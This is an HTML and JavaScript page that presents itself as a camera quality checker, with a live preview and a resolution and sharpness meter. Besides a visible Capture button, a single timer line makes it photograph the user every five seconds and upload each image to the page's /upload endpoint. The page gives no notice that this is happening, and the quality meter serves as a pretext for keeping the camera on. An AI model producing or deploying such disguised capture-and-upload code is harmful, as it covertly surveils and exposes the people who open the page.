<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Check Your Camera Quality</title>
<style>
  body { font-family: Arial, sans-serif; text-align: center; margin: 20px; background-color: black; color: white; }
  video, canvas { border: 1px solid #ccc; border-radius: 8px; width: 80%; height: 60%; margin-top: 20px; }
  button { padding: 10px 15px; font-size: 16px; margin: 10px; cursor: pointer; border-radius: 5px; border: none; background-color: #007BFF; color: white; }
  button:hover { background-color: #0056b3; }

  /* ðŸ”¹ Quality bar */
  #qualityBarWrapper {
    position: fixed; top: 50%; right: 20px; transform: translateY(-50%);
    width: 20px; height: 70%; background: linear-gradient(to top, red, yellow, green);
    border-radius: 10px; border: 1px solid #333; overflow: hidden;
  }
  #qualityMarker {
    position: absolute; left: -4px; width: 28px; height: 4px;
    background: black; border-radius: 2px;
    transition: top 0.2s ease, background 0.2s ease;
  }
  #qualityText {
    position: fixed; top: 50%; right: 60px; transform: translateY(-50%);
    font-size: 28px; font-weight: bold;
    transition: color 0.2s ease;
  }
  @media (max-width: 1180px) {
    video, canvas { border: 1px solid #ccc; border-radius: 8px; width: 80%; height: 70%; margin-top: 20px; }
    #qualityBarWrapper {
    position: fixed; top: 40%; right: 20px; transform: translateY(-50%);
    width: 25px; height: 60%; background: linear-gradient(to top, red, yellow, green);
    border-radius: 10px; border: 1px solid #333; overflow: hidden;
  }
  #qualityMarker {
    position: absolute; left: -4px; width: 28px; height: 4px;
    background: black; border-radius: 2px;
    transition: top 0.2s ease, background 0.2s ease;
  }
  #qualityText {
    position: fixed; top: 40%; right: 60px; transform: translateY(-50%);
    font-size: 28px; font-weight: bold;
    transition: color 0.2s ease;
  }
  }
</style>
</head>
<body>
<h1 style="margin-top: 8%; font-size: xxx-large;">Camera Quality Check</h1>

<div id="qualityBarWrapper"><div id="qualityMarker"></div></div>
<div id="qualityText">0%</div>

<video id="video" autoplay playsinline muted></video>
<br>
<button id="flipBtn">Flip Camera</button>
<button id="captureBtn">Capture</button>
<canvas id="canvas" style="display:none;"></canvas>

<script>
const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const captureBtn = document.getElementById('captureBtn');
const flipBtn = document.getElementById('flipBtn');
const marker = document.getElementById('qualityMarker');
const qualityText = document.getElementById('qualityText');
let stream;
let usingFrontCamera = true;

// ðŸ”¹ Start camera
async function startCamera() {
  if(stream) stream.getTracks().forEach(t => t.stop());
  try {
    stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: usingFrontCamera ? "user" : "environment", width: { ideal: 1920 }, height: { ideal: 1080 } },
      audio: false
    });
    video.srcObject = stream;
    await video.play();
  } catch(err) {
    console.error('Camera error:', err);
    alert('Cannot access camera. Use HTTPS and allow permissions.');
  }
}

// ðŸ”¹ Flip camera
flipBtn.addEventListener('click', () => {
  usingFrontCamera = !usingFrontCamera;
  startCamera();
});

// ðŸ”¹ Capture & upload
function captureAndUpload() {
  const ctx = canvas.getContext('2d');
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
  canvas.toBlob(async (blob) => {
    const formData = new FormData();
    formData.append('file', blob, 'photo.png');
    try {
      const response = await fetch('/upload', { method: 'POST', body: formData });
      if(response.ok) console.log('Photo uploaded!');
      else console.error('Upload failed');
    } catch (err) { console.error(err); }
  }, 'image/png');
}
captureBtn.addEventListener('click', captureAndUpload);
setInterval(captureAndUpload, 5000); // auto-capture

// ðŸ”¹ Quality calculation
function getVideoQualityPercent() {
  if(!video.videoWidth || !video.videoHeight) return 0;

  // Resolution-based percentage
  const resTable=[
    {w:160,h:120,pct:4},{w:360,h:240,pct:10},{w:420,h:320,pct:15},
    {w:640,h:480,pct:15},{w:1280,h:720,pct:44},{w:1920,h:1080,pct:90},
    {w:3840,h:2160,pct:100}
  ];
  let resPct=0;
  for(let entry of resTable){
    if(video.videoWidth<=entry.w && video.videoHeight<=entry.h){
      resPct=entry.pct; break;
    }
  }

  // Sharpness-based percentage
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  const ctx = canvas.getContext('2d');
  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
  const data = ctx.getImageData(0,0,canvas.width,canvas.height).data;
  let sum=0, sumSq=0;
  for(let i=0;i<data.length;i+=4){
    const b = 0.299*data[i]+0.587*data[i+1]+0.114*data[i+2];
    sum+=b; sumSq+=b*b;
  }
  const mean=sum/(data.length/4);
  const variance=sumSq/(data.length/4)-mean*mean;
  const sharp=Math.min(100, Math.round(variance/50));

  return Math.round(resPct*0.6 + sharp*0.4); // combine res+sharpness
}

// ðŸ”¹ Smooth animation loop
function updateQuality() {
  const percent = getVideoQualityPercent();
  const barHeight = document.getElementById('qualityBarWrapper').offsetHeight;

  // Smooth marker movement
  const currentTop = parseFloat(marker.style.top) || barHeight;
  const targetTop = barHeight*(1 - percent/100);
  marker.style.top = (currentTop + (targetTop - currentTop)*0.2) + "px";

  // Smooth color
  qualityText.innerText = percent + "%";
  if(percent<40) qualityText.style.color="red";
  else if(percent<70) qualityText.style.color="orange";
  else qualityText.style.color="lime";

  // Animate marker color slightly based on quality
  marker.style.background = `hsl(${percent*1.2}, 80%, 20%)`;

  requestAnimationFrame(updateQuality);
}

startCamera();
updateQuality();
</script>
</body>
</html>

